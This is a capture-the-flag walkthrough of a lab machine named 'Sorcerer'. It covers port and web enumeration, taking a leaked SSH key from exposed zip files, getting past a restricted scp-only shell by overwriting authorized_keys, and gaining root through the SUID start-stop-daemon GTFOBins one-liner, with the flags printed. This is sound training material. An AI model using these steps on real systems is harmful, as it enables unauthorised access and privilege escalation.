```
nmap -sC -sV -p- 192.168.207.100
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-18 11:56 CDT
Nmap scan report for 192.168.207.100
Host is up (0.050s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 812a4224b590a1ce9bace74e1d6db4c6 (RSA)
|   256 d0732a05527f89093776e356c8ab2099 (ECDSA)
|_  256 3a2dde33b01ef2350f8dc8d78ff9e00e (ED25519)
80/tcp    open  http     nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      52497/udp   mountd
|   100005  1,2,3      60161/tcp   mountd
|   100021  1,3,4      32949/udp   nlockmgr
|   100021  1,3,4      33055/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
7742/tcp  open  http     nginx
|_http-title: SORCERER
33055/tcp open  nlockmgr 1-4 (RPC #100021)
39185/tcp open  mountd   1-3 (RPC #100005)
46183/tcp open  mountd   1-3 (RPC #100005)
60161/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.66 seconds
                                                               
```

Attempted to test the websites both on 80 and 7742. I was able to find something interesting on 7742.

```
feroxbuster -u http://192.168.207.100:7742 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.207.100:7742
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       65l      117w     1219c http://192.168.207.100:7742/
301      GET        7l       12w      178c http://192.168.207.100:7742/default => http://192.168.207.100:7742/default/
301      GET        7l       12w      178c http://192.168.207.100:7742/zipfiles => http://192.168.207.100:7742/zipfiles/
200      GET       13l       82w     4733c http://192.168.207.100:7742/zipfiles/sofia.zip
200      GET       13l       81w     4749c http://192.168.207.100:7742/zipfiles/francis.zip
200      GET       13l       82w     4741c http://192.168.207.100:7742/zipfiles/miriam.zip
200      GET       39l      203w    13898c http://192.168.207.100:7742/zipfiles/max.zip
[####################] - 29s    60005/60005   0s      found:7       errors:0      
[####################] - 28s    30000/30000   1063/s  http://192.168.207.100:7742/ 
[####################] - 28s    30000/30000   1070/s  http://192.168.207.100:7742/default/ 
[####################] - 0s     30000/30000   297030/s http://192.168.207.100:7742/zipfiles/ => Directory listing 
```

After looking into these, I was able to find Max's private key.

```
┌──(kali㉿kali)-[~/sorcerer]
└─$ chmod 600 id_rsa
                                                                                                                    
┌──(kali㉿kali)-[~/sorcerer]
└─$ ssh -i id_rsa max@192.168.207.100
PTY allocation request failed on channel 0
ACCESS DENIED.
usage: scp [-346BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]
           [-l limit] [-o ssh_option] [-P port] [-S program] source ... target
Connection to 192.168.207.100 closed.
```

So it seems that they tried to restrict Max's shell to avoid full login. Checking into the other files found I was able to see that a script is loaded in the authorized keys file.

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```

One way to get around this is to write new keys into the user.

```
$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/sorcerer/newkeys/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/sorcerer/newkeys/id_rsa
Your public key has been saved in /home/kali/sorcerer/newkeys/id_rsa.pub
The key fingerprint is:
SHA256:m6+zLiXOmwS3AyipOBtoGx4f7nIPRMo5JG/OjgSuNvE kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|.. .             |
|+o+.             |
|+=+.o . S        |
|**o  +...o       |
|**=o o+oo        |
|=X*Eo.+o..       |
|=o*+..o+++.      |
+----[SHA256]-----+

scp -i id_rsa newkeys/id_rsa.pub max@192.168.207.100:/home/max/.ssh/authorized_keys
scp: Received message too long 1094927173
scp: Ensure the remote shell produces no output for non-interactive sessions.
```

Odd error while trying to upload the new key. After looking, I was able to find the following solution.

```
scp -O -i id_rsa newkeys/id_rsa.pub max@192.168.207.100:/home/max/.ssh/authorized_keys
id_rsa.pub                                                                        100%  563    12.1KB/s   00:00    
```

I was now able to login as Max.

```
┌──(kali㉿kali)-[~/sorcerer/newkeys]
└─$ ssh -i id_rsa max@192.168.207.100                                                     
max@sorcerer:~$ whoami
max
max@sorcerer:~$ ls -la
total 32
drwxr-xr-x 3 max  max  4096 Sep 24  2020 .
drwxr-xr-x 7 root root 4096 Sep 24  2020 ..
-rw-r--r-- 1 max  max   220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 max  max  3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 max  max   807 Apr 18  2019 .profile
-rwxr-xr-x 1 max  max   133 Sep 24  2020 scp_wrapper.sh
drwx------ 2 max  max  4096 Sep 24  2020 .ssh
-rw-r--r-- 1 max  max  1991 Sep 24  2020 tomcat-users.xml.bak
max@sorcerer:~$ cd ..
max@sorcerer:/home$ ls
dennis  francis  max  miriam  sofia
max@sorcerer:/home$ cd dennis
max@sorcerer:/home/dennis$ ls
local.txt
max@sorcerer:/home/dennis$ cat local.txt
3aa962ad90178cc2f6174881c7ab0926
```

I started with linpeas and found something interesting.

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
strings Not Found                                                                                                   
strace Not Found                                                                                                    
-rwsr-xr-x 1 root root 113K Jun 24  2020 /usr/sbin/mount.nfs                                                        
-rwsr-xr-x 1 root root 44K Jun  3  2019 /usr/sbin/start-stop-daemon
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                  
-rwsr-xr-x 1 root root 35K Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                             
-rwsr-xr-x 1 root root 15K Oct  9  2019 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Suid Permissions on `/usr/sbin/start-stop-daemon`

Looking into this I was able to find GTFO bins.

https://gtfobins.github.io/gtfobins/start-stop-daemon/

I was able to get access.

```
max@sorcerer:/tmp$ /usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
# whoami
root
# cd /root
# ls
proof.txt
# cat proof.txt
a0b57e413c3d2293aa2843a3149b1d78

```